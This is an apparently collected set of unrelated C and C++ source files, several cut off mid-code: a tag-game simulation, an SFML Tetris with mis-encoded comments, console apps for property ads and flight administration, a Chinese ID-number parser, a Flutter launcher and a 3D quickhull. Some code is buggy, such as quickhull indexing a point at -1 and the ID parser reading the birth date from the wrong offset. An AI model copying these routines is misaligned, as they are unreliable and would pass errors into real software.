    "#include <iostream>\n#include <vector>\n#define MAX 100\nusing namespace std;\n\nstruct Info{\n    int x,y,dir;\n};\n\nInfo sullae;\n\nbool namu[MAX][MAX]={0,};\nvector<int> runnerMap[MAX][MAX];\n// int map[MAX][MAX]={0,};\n\nint dx[4] = {-1,0,1,0};\nint dy[4] = {0,1,0,-1};\nint N,M,H,K;\nbool opposite= false;\nint len, cnt;\n//\ubaa9\ud45c len\nint curLen= 1;\nvoid moveRunner()\n{\n    vector<int> tmpRunnerMap[MAX][MAX];\n\n    for(int i=0;i<N;i++){\n        for(int j=0;j<N;j++){\n            for(int k=0;k<runnerMap[i][j].size();k++){\n                \n                int d= runnerMap[i][j][k];\n                int dis = abs(i-sullae.x) + abs(j-sullae.y);\n                if(dis > 3) {\n                    tmpRunnerMap[i][j].push_back(runnerMap[i][j][k]);\n                    continue;\n                }\n\n                int nx = i+dx[d];\n                int ny = j+dy[d];\n\n                if( nx < 0 || ny < 0 || nx >= N || ny >= N) {\n                    if( d < 2)  d += 2;\n                    else    d -= 2;\n\n                    nx = i + dx[d];\n                    ny = j + dy[d];\n                }\n\n                if ( nx == sullae.x && ny == sullae.y)  {\n                    nx = nx - dx[d];\n                    ny = ny - dy[d];\n                }\n\n                tmpRunnerMap[nx][ny].push_back(d);\n            }\n        }\n    }\n    \n    for(int i=0;i<N;i++){\n        for(int j=0;j<N;j++){\n            runnerMap[i][j].clear();\n            runnerMap[i][j] = tmpRunnerMap[i][j];\n        }\n    }\n\n}\n\nint catchRunner()\n{\n    int x = sullae.x;\n    int y = sullae.y;\n    int dir = sullae.dir;\n\n    int cnt =0;\n    for(int i=0;i<3;i++)\n    {\n        int nx = x+dx[dir]*i;\n        int ny = y+dy[dir]*i;\n        if( namu[nx][ny])   continue;\n        if( nx <0 || ny <0 || nx >= N || ny >= N)   break;\n\n        if( runnerMap[nx][ny].size() > 0){\n            cnt += runnerMap[nx][ny].size();\n            runnerMap[nx][ny].clear();\n        }\n    }\n    return cnt;\n}\n\nvoid moveSullae()\n{\n    int x =sullae.x;\n    int y =sullae.y;\n    int dir = sullae.dir;\n\n    int nx = x+dx[dir];\n    int ny = y+dy[dir];\n\n    len++;\n\n    if ( len == curLen ) {\n        len=0;\n        cnt++;\n        if( opposite == false){\n            if(dir == 3)    dir = 0;\n            else    dir++;\n        }\n        else {\n            if ( dir == 0 ) dir = 3;\n            else    dir--;\n        }\n        if (cnt == 2)  {\n            cnt = 0;\n            if(!opposite)    curLen++;\n            else    curLen--;\n\n        }\n    }\n\n    if(nx == 0 && ny == 0){\n        opposite= true;\n        curLen = N-1;\n        dir = 2;\n        cnt = -1;\n        len = 0;\n    } else if(nx == (N-1)/2 && ny == (N-1)/2) {\n        opposite= false;\n        curLen=1;\n        dir = 0;\n        cnt = 0;\n        len = 0;\n    }\n    sullae = {nx,ny,dir};\n}\n\nint main(void)\n{\n    ios::sync_with_stdio(false);\n\n    curLen = 1;\n    len = 0;\n    cnt = 0;\n\n    cin >> N >> M >> H >> K;\n    sullae = { (N-1)/2, (N-1)/2,0};\n    \n    for(int i=0;i<M;i++){\n        int x,y,d;\n        cin >> x >> y >> d;\n        if( d==1)   d = 1;\n        else    d = 2;\n        runnerMap[x-1][y-1].push_back(d);\n    }\n    \n    for(int i=0;i<H;i++){\n        int x,y;\n        cin >> x >> y;\n        namu[x-1][y-1] = 1;\n    }\n\n    int score =0;\n    \n    for(int i=1;i<=K;i++){\n       moveRunner();\n        moveSullae();\n       score += i * catchRunner();\n    }\n    cout << score;\n    return 0;\n}",
    "//\u00d1\u00ef\u00e8\u00f1\u00ee\u00ea \u00e1\u00b3\u00e1\u00eb\u00b3\u00ee\u00f2\u00e5\u00ea\n#include <SFML/Graphics.hpp>\n#include <time.h>\n\n\nusing namespace sf;\n\n//\u00ef\u00e0\u00f0\u00e0\u00ec\u00e5\u00f2\u00f0\u00e8 \u00ed\u00e0\u00f8\u00ee\u00e3\u00ee \u00e2\u00b3\u00ea\u00ed\u00e0\nconst int height = 20;\nconst int width = 10;\n\n//\u00cf\u00ee\u00eb\u00e5 \u00ed\u00e0\u00f8\u00ee\u00bf \u00e3\u00f0\u00e8\nint field[height][width] = { 0 };\nint barSize = 34;//\u00f0\u00ee\u00e7\u00ec\u00b3\u00f0 \u00ef\u00eb\u00e8\u00f2\u00e8\n\nstruct Point\n{\n    int x, y;\n} a[4], b[4];\n\n//\u00c2\u00f1\u00b3 \u00ed\u00e0\u00f8\u00b3 \u00f4\u00b3\u00e3\u00f3\u00f0\u00e8\nint figure[7][4] = {\n    1,3,5,7,\n    2,4,5,7,\n    3,5,4,6,\n    3,5,4,7,\n    2,3,5,7,\n    3,5,7,6,\n    2,3,4,5,\n};\n\n//\u00d4\u00f3\u00ed\u00ea\u00f6\u00b3\u00ff \u00ef\u00e5\u00f0\u00e5\u00e2\u00b3\u00f0\u00ea\u00e8 \u00e7\u00e0 \u00ec\u00e5\u00e6\u00b3 \u00e3\u00f0\u00e0\u00f4\u00b3\u00f7\u00ed\u00ee\u00e3\u00ee \u00e2\u00b3\u00ea\u00ed\u00e0\nbool check() {\n    for (int i = 0; i < 4; i++)\n        if (a[i].x < 0 || a[i].x >= width || a[i].y >= height)\n            return 0;\n        else if (field[a[i].y][a[i].x])\n            return 0;\n\n    return 1;\n}\n\n\n//\u00ce\u00f1\u00ed\u00ee\u00e2\u00ed\u00e8\u00e9 \u00f6\u00e8\u00ea\u00eb\nint main()\n{\n    srand(time(0));\n\n    RenderWindow window(VideoMode(width * barSize, height * barSize), \"Tetris\");\n\n    //\u00ea\u00ee\u00eb\u00fc\u00ee\u00f0\u00e0 \u00f4\u00b3\u00e3\u00f3\u00f0\n    Texture appearance;\n    appearance.loadFromFile(\"D:/course work/tetris/tiles.png\");\n\n    //\u00ea\u00ee\u00eb\u00fc\u00ee\u00f0\u00ee\u00e2\u00e0 \u00f1\u00f5\u00e5\u00ec\u00e0\n    Sprite tiles(appearance);\n\n    //\u00c7\u00e0\u00e2\u00e0\u00ed\u00f2\u00e0\u00e6\u00e5\u00ed\u00ed\u00ff \u00f2\u00e5\u00ea\u00f1\u00f2\u00f3\u00f0\u00e8 Game Over\n    Texture gameOverTexture;\n    gameOverTexture.loadFromFile(\"D:/course work/tetris/gameOver.png\");\n    Sprite gameOverSprite(gameOverTexture);\n\n    float scaleX = (width * barSize) / static_cast<float>(gameOverTexture.getSize().x);\n    float scaleY = (height * barSize) / static_cast<float>(gameOverTexture.getSize().y);\n    gameOverSprite.setScale(scaleX, scaleY);\n\n\n    //\u00c7\u00e0\u00e4\u00e0\u00ba\u00ec \u00e3\u00ee\u00f0\u00e8\u00e7\u00ee\u00ed\u00f2\u00e0\u00eb\u00fc\u00ed\u00e5 \u00ef\u00e5\u00f0\u00e5\u00ec\u00b3\u00f9\u00e5\u00ed\u00ed\u00ff \u00e9 \u00ee\u00f2\u00e0\u00f6\u00b3\u00fe\n    int directionHorizont = 0;\n    int colorType = 1;\n    bool rotation = false;\n\n    //\u00d2\u00e0\u00e9\u00ec\u00e5\u00f0\n    float timer = 0, delay = 0.3;\n\n    //\u00c3\u00ee\u00e4\u00e8\u00ed\u00ed\u00e8\u00ea\n    Clock clock;\n    bool ad = true;\n\n    bool gameOver = false;  // \u00c4\u00ee\u00e4\u00e0\u00ba\u00ec\u00ee \u00f1\u00f2\u00e0\u00ed \u00e3\u00f0\u00e8\n\n    //\u00d0\u00ee\u00e1\u00ee\u00f2\u00e0 \u00e2\u00b3\u00ea\u00ed\u00e0\n    while (window.isOpen())\n    {\n        //\u00d7\u00e0\u00f1 \u00e7 \u00ef\u00ee\u00f7\u00e0\u00f2\u00ea\u00f3, \u00ff\u00ea\u00e5 \u00ef\u00e5\u00f0\u00e5\u00f0\u00ee\u00e1\u00e8\u00eb\u00e8 \u00e2 \u00f1\u00e5\u00ea\u00f3\u00ed\u00e4\u00e8\n        float time = clock.getElapsedTime().asSeconds();\n        clock.restart();\n        timer += time;\n\n        Event event;\n        while (window.pollEvent(event))\n        {\n            if (event.type == Event::Closed)\n                window.close();\n\n            //\u00cd\u00e0\u00f1\u00f2\u00f0\u00ee\u00ea\u00e8 \u00ea\u00e0\u00eb\u00e2\u00b3\u00e0\u00f2\u00f3\u00f0\u00e8\n            if (event.type == Event::KeyPressed && !gameOver) {\n                if (event.key.code == Keyboard::W)\n                    rotation = true;\n                else if (event.key.code == Keyboard::D)\n                    directionHorizont = 1;\n                else if (event.key.code == Keyboard::A)\n                    directionHorizont = -1;\n            }\n        }\n\n        if (Keyboard::isKeyPressed(Keyboard::S) && !gameOver)\n            delay = 0.05;\n\n        if (!gameOver) {\n            //\u00cf\u00e5\u00f0\u00e5\u00ec\u00b3\u00f9\u00e5\u00ed\u00ed\u00ff \u00ef\u00ee \u00e3\u00ee\u00f0\u00e8\u00e7\u00ee\u00ed\u00f2\u00f3\n            for (int i = 0; i < 4; i++) {\n                b[i] = a[i];\n                a[i].x += directionHorizont;\n            }\n\n            //\u00ce\u00e1\u00ec\u00e5\u00e6\u00e5\u00ed\u00ed\u00ff \u00ea\u00ee\u00f0\u00e4\u00ee\u00ed\u00f3 (\u00ef\u00ee\u00ef\u00e0\u00e4\u00e0\u00ed\u00ed\u00ff \u00ed\u00e0 \u00ea\u00ee\u00f0\u00e4\u00ee\u00ed => \u00ef\u00ee\u00e2\u00e5\u00f0\u00ed\u00e5\u00ed\u00ed\u00ff \u00ed\u00e0 \u00ef\u00ee\u00f7\u00e0\u00f2\u00ea\u00ee\u00e2\u00f3 \u00ea\u00ee\u00ee\u00f0\u00e4\u00e8\u00ed\u00e0\u00f2\u00f3)\n            if (!check()) {\n                for (int i = 0; i < 4; i++)\n                    a[i] = b[i];\n            }\n\n            //\u00cf\u00f0\u00ee\u00f6\u00e5\u00f1 \u00f0\u00ee\u00f2\u00e0\u00f6\u00b3\u00bf\n            if (rotation) {\n                Point centr = a[1];//\u00d6\u00e5\u00ed\u00f2\u00f0 \u00ef\u00ee\u00e2\u00e5\u00f0\u00f2\u00e0\u00ed\u00ed\u00ff\n                for (int i = 0; i < 4; i++) {\n                    int x = a[i].y - centr.y;\n                    int y = a[i].x - centr.x;\n\n                    a[i].x = centr.x - x;\n                    a[i].y = centr.y + y;\n                }\n\n                //\u00c2\u00e8\u00f5\u00b3\u00e4 \u00e7\u00e0 \u00e3\u00f0\u00e0\u00ed\u00e8\u00f6\u00fe \n                if (!check()) {\n                    for (int i = 0; i < 4; i++)\n                        a[i] = b[i];\n                }\n            }\n\n            //\u00d0\u00f3\u00f5 \u00e4\u00ee \u00ed\u00e8\u00e7\u00f3\n            if (timer > delay) {\n                //\u00c3\u00ee\u00f0\u00e8\u00e7\u00ee\u00ed\u00f2\u00e0\u00eb\u00fc\u00ed\u00e5 \u00ef\u00e5\u00f0\u00e5\u00ec\u00b3\u00f9\u00e5\u00ed\u00ed\u00ff\n                for (int i = 0; i < 4; i++) {\n                    b[i] = a[i];\n                    a[i].y += 1;\n                }\n\n                if (!check()) {\n                    for (int i = 0; i < 4; i++)\n                        field[b[i].y][b[i].x] = colorType;\n\n                    //\u00cf\u00e5\u00f0\u00e5\u00e2\u00b3\u00f0\u00ea\u00e0 \u00ed\u00e0 \"Game Over\"\n                    for (int i = 0; i < 4; i++) {\n                        if (b[i].y == 0) {\n                            gameOver = true;\n                            break;\n                        }\n                    }\n\n                    if (!gameOver) {\n                        colorType = 1 + rand() % 7;\n                        //\u00c7\u00e0\u00e4\u00e0\u00ba\u00ec \u00f0\u00e0\u00ed\u00e4\u00ee\u00ec\u00ed\u00b3 \u00ef\u00e0\u00f0\u00e0\u00ec\u00e5\u00f2\u00f0\u00e8 \u00f4\u00b3\u00e3\u00f3\u00f0\u00e8\n                        int figureN = rand() % 7;\n                        for (int i = 0; i < 4; i++) {\n                            a[i].x = figure[figureN][i] % 2;\n                            a[i].y = figure[figureN][i] / 2;\n                        }\n                    }\n                }\n\n                timer = 0;\n            }\n\n            //\u00cf\u00ee\u00ff\u00e2\u00e0 \u00f4\u00b3\u00e3\u00f3\u00f0\u00e8\n            if (ad) {\n                int figureN = rand() % 7;\n                if (a[0].x == 0)\n                    for (int i = 0; i < 4; i++) {\n                        a[i].x = figure[figureN][i] % 2;\n                        a[i].y = figure[figureN][i] / 2;\n                    }\n                ad = false;\n            }\n\n            //\u00c7\u00ed\u00e8\u00ea\u00ed\u00e5\u00ed\u00ed\u00ff \u00e7\u00e0\u00ef\u00ee\u00e2\u00ed\u00e5\u00ed\u00ee\u00e3\u00ee \u00f0\u00ff\u00e4\u00f3\n            int",
    "#include <stdio.h>\n#include <stdlib.h>\n#include <string.h>\n#include \"functionHeaders.h\"\n\nint *ad_count ;\nPerson *is_login = NULL;\n\nint main() {\n\n    ad_count = (int*) malloc(sizeof(int));\n    int cas;\n    is_login = (Person*) malloc(sizeof (Person));\n    FILE *ads = fopen(\"ads.txt\", \"a+\");\n\n    int *temp_count ;\n    temp_count = (int *) malloc(sizeof (int));\n    *ad_count = 0;\n\n    char line[400];\n    char lastLine[400];\n\n    while (fgets(line, sizeof(line), ads) != NULL) {\n        strcpy(lastLine, line);\n        sscanf(lastLine, \"%d\", temp_count);\n        if(*temp_count != -1)\n            sscanf(lastLine, \"%d\", ad_count);\n    }\n    fclose(ads);\n    //printf(\"%d\\n\", *ad_count);\n\n\n    int flag=1;\n\n\n    while (flag) {\n        is_login = (Person*) malloc(sizeof (Person));\n        printf(\"0: View the list of all ads\\n\");\n        printf(\"1: Signup\\n\");\n        printf(\"2: Login\\n\");\n        printf(\"3: Exit\\n\");\n        printf(\"Enter a number:\\n\");\n        scanf(\"%d\", &cas);\n        printf(\"\\n\");\n        switch (cas) {\n            case 0: {\n                int filter;\n                printf(\"Enter a number to filter the ads based on that:\\n\");\n                printf(\"0: Area\\n\");\n                printf(\"1: Price\\n\");\n                printf(\"2: Economical\\n\");\n                printf(\"3: No Filter\\n\");\n\n                scanf(\"%d\", &filter);\n\n                print(filter);\n                break;\n            }\n            case 1: {\n                signup();\n                break;\n            }\n\n\n\n            case 2: {\n                login();\n                int flag2 = 1;\n                if (strstr(is_login->user, \"seller\") != NULL) {\n                    int option;\n                    while (flag2) {\n                        printf(\"0: View the list of all ads\\n\");\n                        printf(\"1: Add an ad\\n\");\n                        printf(\"2: See your ads\\n\");\n                        printf(\"3: request to promote your access\\n\");\n                        printf(\"4: Go back\\n\");\n                        printf(\"Enter a number:\");\n                        scanf(\"%d\", &option);\n                        printf(\"\\n\");\n                        switch (option) {\n                            case 0:\n                                int filter1;\n                                printf(\"Enter a number to filter the ads based on that:\\n\");\n                                printf(\"0: Area\\n\");\n                                printf(\"1: Price\\n\");\n                                printf(\"2: Economical\\n\");\n                                printf(\"3: No Filter\\n\");\n\n                                scanf(\"%d\", &filter1);\n\n                                print(filter1);\n                                break;\n                            case 1:\n                                Add_ad();\n                                break;\n                            case 2:\n                                print_personal_ads();\n                                break;\n                            case 3:\n                                request_promot();\n                                break;\n                            case 4:\n                                flag2 = 0;\n                                is_login = NULL;\n                                break;\n                        }\n                    }\n\n\n                } else if (strstr(is_login->user, \"agent\") != NULL) {\n                    printf(\"Do you choose to log in as a seller(1) or an agent(2)?:\");\n                    int part;\n                    scanf(\"%d\", &part);\n                    if (part == 1) {\n                        int option;\n                        while (flag2) {\n                            printf(\"0: View the list of all ads\\n\");\n                            printf(\"1: Add an ad\\n\");\n                            printf(\"2: See your ads\\n\");\n                            printf(\"3: Go back\\n\");\n                            printf(\"Enter a number:\");\n                            scanf(\"%d\", &option);\n\n                            switch (option) {\n                                case 0:\n                                    int filter1;\n                                    printf(\"Enter a number to filter the ads based on that:\\n\");\n                                    printf(\"0: Area\\n\");\n                                    printf(\"1: Price\\n\");\n                                    printf(\"2: Economical\\n\");\n                                    printf(\"3: No Filter\\n\");\n\n                                    scanf(\"%d\", &filter1);\n\n                                    print(filter1);\n                                    break;\n                                case 1:\n                                    Add_ad();\n                                    break;\n                                case 2:\n                                    print_personal_ads();\n                                    break;\n                                case 3:\n                                    is_login = NULL;\n                ",
    "#include \"ID_rule.h\"\n\nQString ID_rule::get_provience(string id)\n{\n\tQString provience = \"0\";\n\tprovience = QString::fromStdString(un_map[id]);\n\treturn provience;\n}\n\nQString ID_rule::get_sex(string id)\n{\n\tint ID = stoi(id);\n\tif (ID % 2 == 0)\n\t\treturn \"\u5973\";\n\telse\n\t\treturn \"\u7537\";\n}\n\nQString ID_rule::get_birthday(string id)\n{\n\tQString year = QString::fromStdString(id.substr(1, 4));\n\tQString month = QString::fromStdString(id.substr(5, 2));\n\tQString day = QString::fromStdString(id.substr(7, 2));\n\treturn year + \"\u5e74\" + month + \"\u6708\" + day + \"\u65e5\";\n}\n\nID_rule::ID_rule()\n{\n\tvector<string> key = {\n\t\"11\", \"12\", \"13\", \"14\", \"15\",\n\t\"21\", \"22\", \"23\",\n\t\"31\", \"32\", \"33\", \"34\", \"35\", \"36\", \"37\",\n\t\"41\", \"42\", \"43\",\n\t\"44\", \"45\", \"46\",\n\t\"51\", \"52\", \"53\", \"54\", \"50\",\n\t\"61\", \"62\", \"63\", \"64\", \"65\",\n\t\"71\", \"81\", \"82\"\n\t};\n\n\tvector<string> value = {\n\t\t\"\u5317\u4eac\",\"\u5929\u6d25\",\"\u6cb3\u5317\",\"\u5c71\u897f\",\"\u5185\u8499\u53e4\",\n\t\t\"\u8fbd\u5b81\",\"\u5409\u6797\",\"\u9ed1\u9f99\u6c5f\",\n\t\t\"\u4e0a\u6d77\",\"\u6c5f\u82cf\",\"\u6d59\u6c5f\",\"\u5b89\u5fbd\",\"\u798f\u5efa\",\"\u6c5f\u897f\",\"\u5c71\u4e1c\",\n\t\t\"\u6cb3\u5357\",\"\u6e56\u5317\",\"\u6e56\u5357\",\n\t\t\"\u5e7f\u4e1c\",\"\u5e7f\u897f\",\"\u6e56\u5357\",\n\t\t\"\u56db\u5ddd\",\"\u8d35\u5dde\",\"\u4e91\u5357\",\"\u897f\u85cf\",\"\u91cd\u5e86\",\n\t\t\"\u9655\u897f\",\"\u7518\u8083\",\"\u9752\u6d77\",\"\u5b81\u590f\",\"\u65b0\u7586\",\n\t\t\"\u53f0\u6e7e\",\"\u9999\u6e2f\",\"\u6fb3\u95e8\"\n\t};\n\tfor (int i = 0; i < key.size(); i++)\n\t\tun_map[key[i]] = value[i];\n}\n",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"connecto_app\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "#include <iostream>\n#include <vector>\n#include <algorithm>\n#include <cmath>\nusing namespace std;\n\nstruct Point {\n    double x, y, z;\n};\n \nstruct Face {\n    int a, b, c;\n    bool visible;\n};\n\nvector<Point> points;\nvector<Face> faces;\n// t\u00ednh kho\u1ea3ng c\u00e1ch AB;\ndouble dist(Point a, Point b) {\n    return sqrt((a.x - b.x)*(a.x - b.x) + (a.y - b.y)*(a.y - b.y) + (a.z - b.z)*(a.z - b.z));\n}\n// t\u00ednh kho\u1ea3ng cach t\u1eeb \u0111i\u1ec3m p \u0111\u1ebfn m\u1eb7t ph\u1eb3ng ch\u1ee9a a,b,c;\ndouble dist(Face f, Point p) {\n    Point a = points[f.a];\n    Point b = points[f.b];\n    Point c = points[f.c];\n    double d = ((b.y - a.y)*(c.z - a.z) - (b.z - a.z)*(c.y - a.y))*p.x\n        + ((b.z - a.z)*(c.x - a.x) - (b.x - a.x)*(c.z - a.z))*p.y\n        + ((b.x - a.x)*(c.y - a.y) - (b.y - a.y)*(c.x - a.x))*p.z\n        - (a.x*(b.y*c.z - c.y*b.z) + a.y*(b.z*c.x - c.z*b.x) + a.z*(b.x*c.y - c.x*b.y));\n    return abs(d) / sqrt((b.y - a.y)*(b.y - a.y) + (b.z - a.z)*(b.z - a.z) + (c.y - b.y)*(c.y - b.y) + (c.z - b.z)*(c.z - b.z) + (a.y - c.y)*(a.y - c.y) + (a.z - c.z)*(a.z - c.z));\n}\n\n// th\u00eam m\u1ed9t m\u1eb7t ph\u1eb3ng v\u00e0o t\u1eadp m\u1eb7t ph\u1eb3ng\nvoid add_face(int a, int b, int c) {\n    Face f = { a, b, c, true };\n    faces.push_back(f);\n}\n\nvoid build_hull(int a, int b, int c) {\n    if (faces.size() > 1000) return; // gi\u1edbi h\u1ea1n \u0111\u1ed9 s\u00e2u \u0111\u1ec7 quy \u0111\u1ec3 ng\u0103n v\u00f2ng l\u1eb7p v\u00f4 h\u1ea1n\n    bool found_face = false;\n\n    for (int i = 0; i < points.size(); i++) {\n        if (i == a || i == b || i == c) continue;\n        Point p = points[i];\n        double d1 = dist(points[a], p);\n        double d2 = dist(points[b], p);\n        double d3 = dist(points[c], p);\n\n        if (d1 >= 0 && d2 >= 0 && d3 >= 0) {\n            found_face = true;\n            add_face(a, b, i);\n            add_face(b, c, i);\n            add_face(c, a, i);\n            build_hull(i, b, a);\n            build_hull(a, c, i);\n            build_hull(b, i, c);\n            break;\n        }\n    }\n\n    if (!found_face) {\n        for (auto &f : faces) {\n            if (f.visible && dist(f, points[a]) <= 0) {\n                f.visible = false;\n                build_hull(f.b, f.a, a);\n                build_hull(f.c, f.b, a);\n                build_hull(f.a, f.c, a);\n            }\n        }\n    }\n}\n\nvector<Face> quickhull() {\n    // t\u00ecm c\u00e1c \u0111i\u1ec3m c\u00f3 t\u1ecda \u0111\u1ed9 x nh\u1ecf nh\u1ea5t v\u00e0 l\u1edbn nh\u1ea5t\n    int min_x = 0, max_x = 0;\n    for (int i = 1; i < points.size(); i++) {\n        if (points[i].x < points[min_x].x) min_x = i;\n        if (points[i].x > points[max_x].x) max_x = i;\n    }\n\n    // th\u00eam t\u1ee9 di\u1ec7n ban \u0111\u1ea7u\n    add_face(min_x, max_x, -1); // th\u00eam m\u1ed9t \u0111i\u1ec3m b\u1ed5 sung v\u1edbi t\u1ecda \u0111\u1ed9 z th\u1ea5p nh\u1ea5t \u0111\u1ec3 ng\u0103n ch\u1eb7n s\u1ef1 \u0111\u1ed3ng ph\u1eb3ng\n    for (int i = 0; i < points.size(); i++) {\n        if (i == min_x || i == max_x) continue;\n        Point p = points[i];\n        double d1 = dist(points[min_x], p);\n        double d2 = dist(points[max_x], p);\n        double d3 = dist(points[faces[0].a], p);\n        double d4 = dist(points[faces[0].b], p);\n        double d5 = dist(points[faces[0].c], p);\n        if (d1 > 0 && d2 > 0 && d3 > 0 && d4 > 0 && d5 > 0) {\n            add_face(min_x, max_x, i);\n            add_face(max_x, faces.back().b, i);\n            add_face(faces.back().c, min_x, i);\n            add_face(faces.back().a, faces.back().c, i);\n        }\n    }\n\n    // \u0111\u1ec7 quy x\u00e2y d\u1ef1ng  the hull\n    for (auto &f : faces) {\n        if (f.visible) {\n            build_hull(f.a, f.b, f.c);\n        }\n    }\n\n    // lo\u1ea1i b\u1ecf nh\u1eefng khu\u00f4n m\u1eb7t kh\u00f4ng ph\u1ea3i l\u00e0 m\u1ed9t ph\u1ea7n c\u1ee7a the hull\n    vector<Face> hull_faces;\n    for (auto &f : faces) {\n        if (f.visible) {\n            hull_faces.push_back(f);\n        }\n    }\n\n    return hull_faces;\n}\n\nint main() {\n    // input the points\n    int n;\n    cout << \"Enter the number of points: \";\n    cin >> n;\n    for (int i = 0; i < n; i++) {\n        Point p;\n        cout << \"Enter point \" << i+1 << \": \";\n        cin >> p.x >> p.y >> p.z;\n        points.push_back(p);\n    }\n\n    // find the convex hull\n    vector<Face> hull_faces = quickhull();\n\n    // output the faces of the convex hull\n    cout << \"Faces of the convex hull:\" << endl;\n    for (auto &f : hull_faces) {\n        cout << \"(\" << f.a << \", \" << f.b << \", \" << f.c << \")\" << endl;\n    }\n\n    return 0;\n}\n",
    "#include \"Admin.h\"\n#include <fstream>\n#include <iostream>\n#include <algorithm> // for std::remove_if\n\nAdmin::Admin(std::string uid, std::string pwd) : User(uid, pwd) {}\n\nvoid Admin::displayMenu() const {\n    std::cout << \"Admin Menu:\\n\";\n    std::cout << \"1. Add Flight\\n\";\n    std::cout << \"2. Modify Flight\\n\";\n    std::cout << \"3. Delete Flight\\n\";\n    std::cout << \"4. Add Plane\\n\";\n    std::cout << \"5. Modify Plane\\n\";\n    std::cout << \"6. Delete Plane\\n\";\n    std::cout << \"7. Save Flights\\n\";\n    std::cout << \"8. Load Flights\\n\";\n    std::cout << \"9. Save Planes\\n\";\n    std::cout << \"10. Load Planes\\n\";\n    std::cout << \"11. Exit\\n\";\n}\n\nvoid Admin::addFlight() {\n    std::string fid, pid, orig, dest, dTime, aTime;\n    double price;\n    std::cout << \"Enter Flight ID: \";\n    std::cin >> fid;\n    std::cout << \"Enter Plane ID: \";\n    std::cin >> pid;\n    std::cout << \"Enter Origin: \";\n    std::cin >> orig;\n    std::cout << \"Enter Destination: \";\n    std::cin >> dest;\n    std::cout << \"Enter Departure Time: \";\n    std::cin >> dTime;\n    std::cout << \"Enter Arrival Time: \";\n    std::cin >> aTime;\n    std::cout << \"Enter Price: \";\n    std::cin >> price;\n\n    flights.emplace_back(fid, pid, orig, dest, dTime, aTime, price);\n    std::cout << \"Flight added successfully.\\n\";\n    saveFlightsToFile(\"flights.txt\"); // Save to file\n}\n\nvoid Admin::modifyFlight() {\n    std::string fid;\n    std::cout << \"Enter Flight ID to modify: \";\n    std::cin >> fid;\n    for (auto& flight : flights) {\n        if (flight.getFlightID() == fid) {\n            std::string pid, orig, dest, dTime, aTime;\n            double price;\n            std::cout << \"Enter new Plane ID: \";\n            std::cin >> pid;\n            std::cout << \"Enter new Origin: \";\n            std::cin >> orig;\n            std::cout << \"Enter new Destination: \";\n            std::cin >> dest;\n            std::cout << \"Enter new Departure Time: \";\n            std::cin >> dTime;\n            std::cout << \"Enter new Arrival Time: \";\n            std::cin >> aTime;\n            std::cout << \"Enter new Price: \";\n            std::cin >> price;\n\n            flight.setPlaneID(pid);\n            flight.setOrigin(orig);\n            flight.setDestination(dest);\n            flight.setDepartureTime(dTime);\n            flight.setArrivalTime(aTime);\n            flight.setPrice(price);\n\n            std::cout << \"Flight modified successfully.\\n\";\n            saveFlightsToFile(\"flights.txt\"); // Save to file\n            return;\n        }\n    }\n    std::cout << \"Flight ID not found.\\n\";\n}\n\nvoid Admin::deleteFlight() {\n    std::string fid;\n    std::cout << \"Enter Flight ID to delete: \";\n    std::cin >> fid;\n    auto it = std::remove_if(flights.begin(), flights.end(), [&fid](const Flight& flight) {\n        return flight.getFlightID() == fid;\n        });\n    if (it != flights.end()) {\n        flights.erase(it, flights.end());\n        std::cout << \"Flight deleted successfully.\\n\";\n        saveFlightsToFile(\"flights.txt\"); // Save to file\n    }\n    else {\n        std::cout << \"Flight ID not found.\\n\";\n    }\n}\n\nvoid Admin::addPlane() {\n    std::string id, type;\n    int rows, seatsPerRow;\n    std::cout << \"Enter Plane ID: \";\n    std::cin >> id;\n    std::cout << \"Enter Plane Type: \";\n    std::cin >> type;\n    std::cout << \"Enter Number of Rows: \";\n    std::cin >> rows;\n    std::cout << \"Enter Seats Per Row: \";\n    std::cin >> seatsPerRow;\n\n    planes.emplace_back(id, type, rows, seatsPerRow);\n    std::cout << \"Plane added successfully.\\n\";\n    savePlanesToFile(\"planes.txt\"); // Save to file\n}\n\nvoid Admin::modifyPlane() {\n    std::string id;\n    std::cout << \"Enter Plane ID to modify: \";\n    std::cin >> id;\n    for (auto& plane : planes) {\n        if (plane.getPlaneID() == id) {\n            std::string type;\n            int rows, seatsPerRow;\n            std::cout << \"Enter new Plane Type: \";\n            std::cin >> type;\n            std::cout << \"Enter new Number of Rows: \";\n            std::cin >> rows;\n            std::cout << \"Enter new Seats Per Row: \";\n            std::cin >> seatsPerRow;\n\n            plane.setPlaneType(type);\n            plane.setRows(rows);\n            plane.setSeatsPerRow(seatsPerRow);\n\n            std::cout << \"Plane modified successfully.\\n\";\n            savePlanesToFile(\"planes.txt\"); // Save to file\n            return;\n        }\n    }\n    std::cout << \"Plane ID not found.\\n\";\n}\n\nvoid Admin::deletePlane() {\n    std::string id;\n    std::cout << \"Enter Plane ID to delete: \";\n    std::cin >> id;\n    auto it = std::remove_if(planes.begin(), planes.end(), [&id](const Plane& plane) {\n        return plane.getPlaneID() == id;\n        });\n    if (it != planes.end()) {\n        planes.erase(it, planes.end());\n        std::cout << \"Plane deleted successfully.\\n\";\n        savePlanesToFile(\"planes.txt\"); // Save to file\n    }\n    else {\n        std::cout << \"Plane ID not found.\\n\";\n    }\n}\n\nvoid Admin::saveFlightsToFile(const std::string& filename) const {\n    std::ofstream outFile(filename",
